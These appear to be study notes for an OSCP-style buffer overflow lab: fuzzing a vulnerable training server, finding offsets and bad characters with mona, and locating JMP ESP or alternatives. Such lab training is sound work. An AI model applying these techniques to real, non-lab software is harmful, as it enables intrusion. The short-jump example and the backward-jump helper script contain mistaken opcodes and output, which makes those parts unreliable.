# Buffer Overflows

lets try to connect with simple python client 
we can also do with **nc**

```python
import socket 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.129.253',1337))
msg = s.recv(2048).decode()
print(msg)
```

now we get the output 

```
Welcome to OSCP Vulnerable Server! Enter HELP for help.
```

ok now we need to send **HELP** and see whats output

```python

import socket 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.129.253',1337))
msg = s.recv(2048).decode()
print(msg)
msg = 'HELP'
s.send(msg.encode('raw_unicode_escape'))
msg = s.recv(2048).decode()
print(msg)
s.close()
```

we get the output

```
Welcome to OSCP Vulnerable Server! Enter HELP for help.
Valid Commands:   
HELP
OVERFLOW1 [value] 
OVERFLOW2 [value] 
OVERFLOW3 [value] 
OVERFLOW4 [value] 
OVERFLOW5 [value] 
OVERFLOW6 [value] 
OVERFLOW7 [value] 
OVERFLOW8 [value] 
OVERFLOW9 [value] 
OVERFLOW10 [value]
EXIT
```

---

## Fuzzing Template

i am fan of boofuzz (no offense to spike or sulley)
this template can be used to fuzz instantly

change ipaddress , port and at OVERFLOW1 according to your application
```python
from boofuzz import * 

session = Session(target=Target(connection=SocketConnection('192.168.0.10',31337,proto='tcp')))
s_initialize("FUZZ")
s_static("OVERFLOW1 ")
s_string("AAAA")
session.connect(s_get("FUZZ"))
session.fuzz()
```

---

## Pattern Generation

Using **msf-pattern_create**
```
$ /usr/bin/msf-pattern_create -l 20  
Aa0Aa1Aa2Aa3Aa4Aa5Aa
```

Finding Offset using **msf-pattern_offset**
```
$ /usr/bin/msf-pattern_offset -q Aa3A
[*] Exact match at offset 9
```

Using online website 
```
https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
```

I also made a pattern_generator.py
simple but efficient in searching any length bytes

```python
import random

data = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',\
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',\
        '1','2','3','4','5','6','7','8','9','0']

length = int(input("enter length of the pattern size "))
pattern = ''
for i in range(length):
    pattern += data[random.randint(0,61)]

#print("pattern generated")
print(pattern)
item = input("enter string to find offset ")
#index1 = pattern.find(item)
indexes = [] 
item_length = len(item)
for i in range(0,len(pattern)):
    temp = pattern[i:i+item_length]
    if temp == item:
        indexes.append(i)
for every in indexes:
    print(every)
```

---

## Bad Character Detection

generate all bytes using mona
```
!mona bytearray -b "\x00"
```

generate using python
```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

comparing bytes from esp to file
```
!mona compare -f c:\mona\program\bytearray.bin -a esp_address
```

---

## Finding JMP REGISTER

using mona
```
!mona jmp -r register -cpb "\x00\x0a\x0d"

!mona jmp -r esp -cpb "\x00\x0a\x0d"

```

using Immunity Debugger
```
Right click on CPU Pane > Search for > All commands in All Modules 

Enter JMP ESP

```

---

## Setting Breakpoint at eip address

do this and debug when ur shellcode doesnot execute

```
Right click on CPU Pane > Go to > Expression > put jmp esp address > Toggle Breakpoint
```

click the next button right next to run button 

---

## Alternatives to JMP ESP

when there is no jmp esp , we can try these alternatives

**CALL ESP**
```
This is similar to jmp esp
```

**PUSH RET**
```
PUSH esp 
RET

first instruction pushes esp address on to stack
RET takes top of stack that is address of esp and places in eip
```

---

## Tackling NULL Bytes
if there are some junk or null bytes after eip and before esp 
like less than 8 bytes

**POP POP RET**
first pop operation takes content at esp and puts in a register
another pop does the same
ret will place esp content into eip
we can search for these 
POP reg32
POP reg32
RET

using mona
```
!mona pop pop ret
```

using Immunity 
```
Right Click on CPU Pane > Search for > ALL SEQUENCES OF COMMANDS IN ALL MODULES > 

POP reg32
POP reg32
RET

```

**SHORT JMP**
we can convert our assembly instructions to opcode
and write opcode in esp instead of address
go to this website and assemble instructions
```
https://defuse.ca/online-x86-assembler.htm
```
lets say we wanna jump 40 bytes
```
op code is e9 3c 00 00 00  
esp = '\x90\x90\x3c\xe9'
```
it will jump 40 bytes down 

i wrote a python script u can choose to jump forward or backward
```python
n = int(input("Enter how many bytes you want to jump :"))
direction = int(input("Enter which direction you want to jump 1.forward 2. backward"))

if direction == 1:
    print("\\xeb\\{}".format(hex(n)[1:]))

if direction == 2:
    temp = 256-n
    print("\\xeb\\{}".format(hex(temp)))
```

There are many ways to escape null or bad bytes
practice and you will find more interesting ways 